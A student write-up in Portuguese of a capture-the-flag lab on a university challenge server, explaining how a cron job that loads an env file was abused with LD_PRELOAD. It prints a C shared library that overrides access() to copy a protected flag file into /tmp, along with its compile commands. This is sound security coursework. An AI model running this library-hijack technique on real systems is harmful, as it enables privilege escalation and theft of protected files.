
# CTF Semana #4 (Linux Environment)

##### Reconhecimento e recolha de informação

Começamos por aceder ao servidor do desafio Capture the Flag, *ctf-fsi.fe.up.pt*, onde procuramos por uma vulnerabilidade que pudéssemos explorar. Observamos os diversos ficheiros e diretórios existentes e as suas respetivas permissões no sistema. Analisámos o código do script presente na pasta flag_reader e reparamos que usa a função **access** da biblioteca ***<unistd.h>***. Reparamos também que apenas tínhamos acesso de escrita ao diretório **/tmp** no sistema, o que nos poderia vir a ser útil no futuro. Por fim, verificamos que o ficheiro em **/home/flag_reader/my_script.sh** era executado todos os minutos, com permissões do criador, após carregar as variáveis de ambiente do ficheiro env, através do cronscript em **/etc/cron.d/my_cron_script**. Este último ponto chamou-nos à atenção e tornou-se o ponto principal da nossa abordagem.

##### Exploração da vulnerabilidade
Com base na situação identificada, decidimos explorar a vulnerabilidade associada à substituição da biblioteca. A nossa estratégia foi desenvolver uma biblioteca personalizada que executasse uma operação específica à nossa escolha quando fosse chamada.

##### Explicação do ataque

1. Criação da Biblioteca Personalizada
Começamos por criar uma biblioteca personalizada em C. Esta biblioteca continha uma função personalizada que copiaria o ficheiro do diretório /flags/flag.txt para um ficheiro de texto no diretório /tmp. Aqui está o conteúdo do ficheiro:

        #include <stdio.h> 
        #include <stdlib.h>
        #include <unistd.h>
        int access(const char *pathname, int mode){
           system("/bin/cp /flags/flag.txt >> /tmp/myflag.txt");
           return 0;
        } 

2. Compilação da Biblioteca
Compilamos a nossa biblioteca personalizada usando os seguintes comandos:
 **gcc -fPIC -g -c mylib.c**
 **gcc -shared -o libmylib.so.1.0.1 mylib.o -lc**

3. Substituição da Biblioteca no Diretório Temporário
Como tínhamos permissão para escrever no diretório /tmp, introduzimos a nossa variável de ambiente **LD_PRELOAD=/tmp/libmylib.so.1.0.1** no ficheiro **env** de forma a enganar o sistema a utilizar a nossa biblioteca em vez da biblioteca original.

##### Conclusão
Com a nossa biblioteca, o sistema executou a função **access** e o conteúdo do ficheiro **flag.txt** foi copiado para um ficheiro de texto que nós pudéssemos abrir. Por fim utilizamos o comando **cat** para abrir o novo ficheiro de texto. Desta forma, conseguimos capturar a flag ao explorar a vulnerabilidade.
Este exercício destaca a necessidade de compreender o funcionamento dos sistemas e das bibliotecas, bem como a importância da segurança na sua gestão. Além disso, também fortaleceu a nossa habilidade de identificar e explorar vulnerabilidades em ambientes controlados.

